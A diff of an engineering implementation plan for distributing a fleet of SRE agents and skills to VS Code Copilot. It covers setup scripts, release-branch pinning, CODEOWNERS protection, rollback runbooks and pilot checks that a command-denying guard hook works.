+- [ ] **Step 3: `scripts/probe_copilot.py`** (human-run, model+time — NOT in Gate A): orchestrate native Copilot evidence for each predicate row. While VS Code has no documented headless interface, print each exact prompt and ingest/export the resulting transcript rather than pretending the Python process drove the UI; it must not shell out to Claude. Include the REQUIRED stack-profile canary, chain-load probe, payload-shape probes, plugin/fallback loading, `disable-model-invocation`, and reviewer tools-omission probe. Keep a sibling Claude runner or mode for the generated Claude projection, but label its results Claude-only. This file is the Copilot re-run entrypoint after every VS Code/Copilot upgrade; `-Verify` version skew triggers it.
 - [ ] **Step 4:** Run `py -3 scripts/probe_copilot.py` once end-to-end; record pass rates per row in the commit body (a consistently-failing row = pull that content back into the core and accept its tokens — the stated fallback, decided per row with the owner). Gate A green; commit.
 
 ### Task 40: CI extension + old-machinery deletion
@@ -1419,7 +1470,7 @@ to catch.
 
 # PHASE 5 — DISTRIBUTION (branch `phase-5-distribution`)
 
-*Only here do the org gates matter — they decide the channel, never the content; the layout is identical either way.*
+*Only here do the org gates matter — they decide which Copilot delivery channel consumes the same generated Copilot projection; Claude remains separate.*
 
 ### Task 42: The three gate checks — on one engineer's machine
 
@@ -1443,7 +1494,7 @@ to catch.
 - [ ] **Step 1: `scripts/setup.ps1`** — the two channels are different scripts, not one sequence. Structure (complete behaviors; PowerShell 5.1-safe — no `&&`, no ternary):
   1. **Preflight (both channels):** `git` reachable; `gh auth status` exits 0 (the production-change-gate shells `gh api` — a missing auth fails mysteriously later); VS Code user `settings.json` located (`$env:APPDATA\Code\User\settings.json`). Any miss: print the one-line fix, exit 1.
   2. **`-Channel plugin`:** settings edit — **JSONC hazard:** `ConvertFrom-Json` fails on comments or silently strips them on rewrite. Do **targeted text insertion**: if the key exists, leave it and report; else insert `"chat.plugins.enabled": true,` and `"chat.plugins.marketplaces": ["latent-sre/sre-agents"],` immediately after the opening `{` with the file's own indentation, preserving every other byte. On any parse doubt, print the two lines for manual paste and continue to `-Verify`. Then print the one manual step: *Extensions → `@agentPlugins` → sre-agents → Install → accept the trust prompt.* **That click is deliberately not scriptable** — it is the publisher-trust gate for code that runs on the machine; we want it conscious.
-  3. **`-Channel fallback`:** clone **`-b release`** to the fixed path `$HOME\sre-agents-fleet` (or `git -C $HOME\sre-agents-fleet pull --ff-only origin release` if present) — **the fallback tracks `release`, never `main`**: an unpinned clone hands every fallback engineer unreviewed HEAD-of-main daily, including the guard that executes on their machine — the exact hazard the marketplace `ref: release` pin closes, reopened on the channel whose safety equivalence the spec load-bears; insert `chat.agentFilesLocations` / `chat.agentSkillsLocations` pointing into it as path-to-boolean maps — `"chat.agentFilesLocations": { "<fixed-clone>/agents": true }` and `"chat.agentSkillsLocations": { "<fixed-clone>/skills": true }` — using the same insertion method; **register the scheduled task** `sre-agents-fleet-sync` running `git -C $HOME\sre-agents-fleet pull --ff-only origin release` daily (an unregistered sync is a permanently stale fleet — the script registers it, not the engineer); **register the user-level hook**: write `~/.copilot/hooks/hooks.json` with the Task-38 launcher command, guard path rewritten to the fixed clone (user-controlled path — satisfies "never a copy the workspace under review supplies"). Without this, the fallback ships `sre`/`observer` holding `execute` with no allowlist — the hole the independent sanity review caught.
+  3. **`-Channel fallback`:** clone **`-b release`** to `$HOME\sre-agents-fleet`, then point `chat.agentFilesLocations` at `<fixed-clone>/generated/copilot/agents` and `chat.agentSkillsLocations` at `<fixed-clone>/skills`. Register the daily `git pull --ff-only origin release` task and the user-level Copilot hook pointing at the fixed trusted clone. Never point fallback discovery at canonical bodies or Claude wrappers.
   4. **`-Verify`** (either channel; also the doc'd health check): reports **active channel** (which settings keys present) · **installed plugin version/ref or clone commit** · **skills actually load** (instructs a `/sre-agents:` completion check; prints MANUAL where unautomatable) · **`gh auth` state** · **hook audit log**: if `~/.sre-agents/guard.log` contains any `identity-missing` entry → print it and **exit non-zero** (Risk 4's reader) · **hook liveness (both channels)**: pipe a synthetic guarded-deny payload through the exact hooks.json launcher command and require the deny JSON — a dead hook writes *no* log at all, so log-reading alone reads healthy on precisely the silently-dead-guard failure mode; this converts "0 silent load failures" from log-grep to executed check on every machine · **clone integrity (fallback)**: checked-out branch is `release` AND `git status --porcelain` is empty (a dirty tree silently breaks `--ff-only` sync and is an edit surface for the guard the hook executes) · **version skew**: warn when the installed VS Code/Copilot versions differ from the last-probed pair recorded in `docs/RESEARCH.md` — the "probes re-run after every upgrade" discipline needs a trigger, not a memory.
 - [ ] **Step 2: `scripts/setup.sh`** — a line-by-line twin (bash) with exactly three substitutions: settings path per-OS (`~/.config/Code/User/settings.json` / macOS equivalent), scheduled task → cron entry (`@daily git -C ~/sre-agents-fleet pull --ff-only`), PowerShell-isms → POSIX. Preserve the path-to-boolean map shape for both location keys. Same channels, same `-Verify`/`--verify` checks, same exit semantics.
 - [ ] **Step 3: Test on this machine**: run the decided channel end-to-end + `-Verify`; paste `-Verify` output into the commit. Gate A green; commit.
@@ -1457,7 +1508,11 @@ to catch.
 - [ ] **Step 3: `.github/CODEOWNERS`** (that location puts the file under its own `/.github/` protection glob; protect everything that executes on a teammate's machine, *and* the gate that protects it):
 
 ```
+/canonical/           @<maintainer>
+/generated/           @<maintainer>
+/plugin.json          @<maintainer>
 /.claude-plugin/      @<maintainer>
+/hooks.json           @<maintainer>
 /hooks/               @<maintainer>
 /scripts/             @<maintainer>
 /.mcp.json            @<maintainer>
@@ -1467,14 +1522,14 @@ to catch.
 ```
 
   The last three are the previously-missed live holes: `.github/` **is** the promotion gate (an unreviewed edit there neuters everything else on this list), and a top-level `/scripts/` glob does not match executable content *inside* skill bundles (`obs-alerting/scripts/error_budget.py`, `pcf-ops/scripts/triage.*`, `ops-tooling/assets/cli_skeleton.py`).
-- [ ] **Step 4: Versioning discipline**, recorded in CONTRIBUTING (Task 45): bump `plugin.json` `version` on every `main`→`release` promotion (the field VS Code uses for update decisions); skill **renames** ship a one-release stub at the old name whose description redirects (the marketplace `renames` map covers plugin renames only); renames on the incident path need a team ack before merge; the team is never all on the same version (≤24h skew is an operational fact — onboarding states it).
+- [ ] **Step 4: Versioning discipline**, recorded in CONTRIBUTING (Task 45): bump canonical `plugin.version`, regenerate both manifests, and require `--check` on every `main`→`release` promotion; never edit either manifest directly. Skill rename/skew rules remain unchanged.
 - [ ] **Step 5:** Commit; PR checks show the protection actually gating.
 
 ### Task 45: README, CONTRIBUTING, the rollback runbook, RESEARCH.md
 
 - [ ] **Step 1: `README.md` rewritten**: what this is (5 agents / 26 skills, VS Code Copilot); install = marketplace add + Extensions install + **the trust prompt and why it exists** (hooks execute on your machine — review before trusting); fallback = `setup.ps1 -Channel fallback`; the maintainer's name; the fleet table generated by `py -3 scripts/validate_fleet.py --write-inventory` (never hand-edited); repo-mechanics pointer for people working *on* the fleet.
 - [ ] **Step 2: `CONTRIBUTING.md`**: **personal-first, promote-by-PR** as repo policy (build in `~/.copilot/{agents,skills}`; a second person wanting it = the PR trigger; `agent-authoring` is the method); the versioning/rename rules from Task 44 Step 4; CODEOWNERS paths and why.
-- [ ] **Step 3: `docs/runbooks/fleet-rollback.md`**: trigger (any Section-8 acceptance regression in rollout week one); procedure — revert the offending commit **on `release`**, **then bump `version` in `plugin.json` [graft from PR #61 — without this the rollback can silently fail to roll anyone back]**: `version` is the field VS Code uses for update decisions, so a plain revert restores an equal-or-lower number and plugin-channel clients may see no update at all; engineers pull within 24h or immediately via *Extensions: Check for Extension Updates*; **announce in the team channel — a silent revert is indistinguishable from a broken update**; verification (`setup.ps1 -Verify` shows the reverted version); postmortem link.
+- [ ] **Step 3: `docs/runbooks/fleet-rollback.md`**: revert the offending `release` commit, then bump canonical `plugin.version`, regenerate both manifests, and require `--check` (a plain revert can restore an equal-or-lower version and silently fail to update clients). Engineers update within 24h or via *Extensions: Check for Extension Updates*; announce, verify, and link the postmortem.
 - [ ] **Step 4: `docs/RESEARCH.md`** retargeted: the five VS Code/Copilot doc pages this design is built on (agent-plugins, agent-skills, custom-agents, hooks, plugin-marketplaces), fetch dates, and the probe list that re-verifies them per upgrade (`scripts/probe_copilot.py`).
 - [ ] **Step 5:** Gate A green (inventory check bites if the README table drifts); commit.
 
@@ -1497,7 +1552,7 @@ to catch.
 
 ### Task 48: Pilot + GATE D #2 — exit only on the acceptance bar
 
-- [ ] **Step 1:** Onboard one engineer via the decided channel (`setup.ps1` + the trust prompt). `-Verify` clean on day 1 — **plus one deliberate guard-fire probe on the installed channel** (run a denied command as `sre`; expect the deny message) **and one primary-control probe** (ask `reviewer` to run a shell command; expect denial-by-absence — Task 3 verified `tools:` omission on the fallback channel only, agent plugins are Preview, and a fail-open regression after an auto-update would otherwise be invisible). This is the only test that the *plugin-shipped* hook actually fires on a real install (the Phase-4 probes ran through the fallback channel; "hooks silently ignored on plugin agents" is a previously-probed platform failure class).
+- [ ] **Step 1:** Onboard one engineer via the decided channel (`setup.ps1` + the trust prompt). `-Verify` clean on day 1, then run one guard-deny and reviewer denial-by-absence probe on that exact Copilot channel. Preserve separate native-plugin and fallback evidence; Claude evidence does not satisfy this pilot row.
 - [ ] **Step 2:** One week of real work touching **≥ 3 agents**, logged: every routing miss (which prompt, what fired, what should have), every guard deny (false or true), every reference the model should have read and didn't — **and every `reviewer` run on a security-sensitive diff: did the security lens produce findings when warranted?** (Spec Risk 5 — the merged reviewer diluting security review — is watched *here* or nowhere; consistent dilution fires the stated fallback: split the reviewer, one file.)
 - [ ] **Step 3: Gate D #2 — the full Section-8 table**, now including the rows deferred from Task 36: **always-on context ≤ 4.5k tokens measured in a real Copilot session** (instrument: Copilot's context/token diagnostics if the client exposes one; if none exists, record the row as measured-by-static-sum and label it `[unverified]` rather than inventing a number); **guard, operationalized [graft from PR #61 — "0 false denies" is unfollowable beside Task 38's seed-set-maturing instruction]: 0 UNRESOLVED false denies at pilot end** — each false deny is fixed same-day (the one-line allowlist addition *is* the seed set maturing) and logged; **more than 3 distinct false denies restarts the pilot week** (the seed set wasn't ready). **0 silent load failures** (`-Verify` + audit log). No unrecovered routing failure. Record the bar as a Section-8 amendment. Re-run Tasks 34–36's canary/routing suites **and Task 39's `probe_copilot.py`** — the REQUIRED stack-profile canary is part of this exit bar (an unloaded stack-profile is a silent correctness regression, spec Section 3); rates must hold.
 - [ ] **Step 4:** Exit decision: every bar met → Phase 7. Any bar missed → fix, and the week restarts for the affected dimension — "fix what reality finds" is not an exit criterion; the bar is.
@@ -1508,10 +1563,10 @@ to catch.
 
 ### Task 49: Promote, retire, announce
 
-- [ ] **Step 1:** Bump `plugin.json` to `1.0.0`; PR `main` → `release` (the promotion gate: green CI + human review — this is the first real exercise of Task 44's protection). Announce in the team channel; onboarding per README.
+- [ ] **Step 1:** Bump canonical `plugin.version` to `1.0.0`, regenerate both manifests, require `--check`, then PR `main` → `release`. Announce in the team channel; onboarding per README.
 - [ ] **Step 2: Week-one watch — with an instrument, not just a trigger [graft from PR #61]:** mid-week, run `setup.ps1 -Verify` on **at least one teammate's machine** (not the owner's), read the guard audit logs, and take one spot routing report. Any Section-8 regression → `docs/runbooks/fleet-rollback.md` (revert on `release`, bump version, announce). Without a named mid-week check, the team-week bar depends on engineers noticing and reporting — the "silence reads as health" failure mode this plan closes everywhere else.
 - [ ] **Step 3: Retire `legacy/claude-fleet/`** (`git rm -r`; git-recoverable). **Named consequence:** `test_no_regressions.py`'s SELF-ARM half loses its targets — in the same commit, delete the self-arm loop and its `LEGACY` constant, keep the FORBIDDEN scan (the patterns are proven by then; the comment should say the legacy proof ran from Phase 1 to this commit). Gate A stays green.
-- [ ] **Step 4: Retire the owner's personal `~/.claude` duplicates** — every entry that **collides with or is superseded by** a fleet skill: `root-cause`, `eng-ladder`, `runbook`, **and the two exact-name collisions `backend-craft` and `frontend-craft` [graft from PR #61 — 63's list missed them]** (optionally also `prompt-craft`, `sre-tool`, `service-onboard`, `lab-audit`, now absorbed under new names). The fleet copies are canonical now; an exact-name personal duplicate keeps competing in every Claude-proxy eval after rollout — the shadowing the clean-room rig diagnosed, which cuts both ways. Re-run one clean-room discovery pass to confirm rates unchanged (they should be — that is what clean-room means; a change is a finding).
+- [ ] **Step 4: Retire the owner's personal `~/.claude` duplicates** — every entry that **collides with or is superseded by** a fleet skill: `root-cause`, `eng-ladder`, `runbook`, **and the two exact-name collisions `backend-craft` and `frontend-craft` [graft from PR #61 — 63's list missed them]** (optionally also `prompt-craft`, `sre-tool`, `service-onboard`, `lab-audit`, now absorbed under new names). The fleet copies are canonical now; an exact-name personal duplicate keeps competing in every generated-Claude-projection eval after rollout — the shadowing the clean-room rig diagnosed, which cuts both ways. Re-run one clean-room discovery pass to confirm rates unchanged (they should be — that is what clean-room means; a change is a finding).
 - [ ] **Step 5:** Update the spec's Status to `implemented`, with an Outcome section: the Gate-D numbers (both runs), the channel decision, and which spec `[unverified]` items got verified with what result.
 
 ---
@@ -1521,9 +1576,7 @@ to catch.
 - **Line numbers in port tasks were measured on 2026-07-13** against `main` (sre-agents) and the pinned sde-agents SHA. If a number has drifted, the quoted heading/pointer text is the anchor — never guess a nearby section.
 - **`py -3` everywhere on this machine.** `gate_a.py` re-invokes under `sys.executable`, so once you're inside it, interpreter naming is settled.
 - **Copy, don't re-type.** For every verbatim move, use `cp`/`git show` + targeted deletion, then read the diff. If you catch yourself improving a sentence mid-move, stop — that is a different change (and it will make Gate C's conformance pass noisy).
-- **The blocking check (Task 3) is the only point where this plan can invalidate itself.** If assertion 3 or 4 fails, Sections 5/5a of the spec change shape (hook-guarding reviewer/scribe), which reshapes Tasks 7, 37, 38. Do not improvise past a STOP.
+- **The blocking format check (Task 2b) is the first point where this plan can invalidate itself.** Any failed native-plugin, fallback, Claude, delegation, terminal, shared-reference, hook, or drift assertion is a STOP before Task 3. Later production assertions remain regression checks, never substitutes for the preflight.
 - **When a probe or eval fails consistently, that is a finding, not a flake** — re-run twice (routing is probabilistic), then act on the design's stated fallback (pull content into the core / fix the boundary / take it to the owner). Do not paper over by hinting at file names in prompts.
 - **Descriptions are the fleet's routing surface.** Every description edit after Task 36 re-runs the affected cluster before merge (manually — never wire it into CI).
 - **Nothing is exempt by path.** If some helper ever seems to need a guard exemption, pin its content hash, not its path — a reviewer sits in a checkout of untrusted code.
-
-
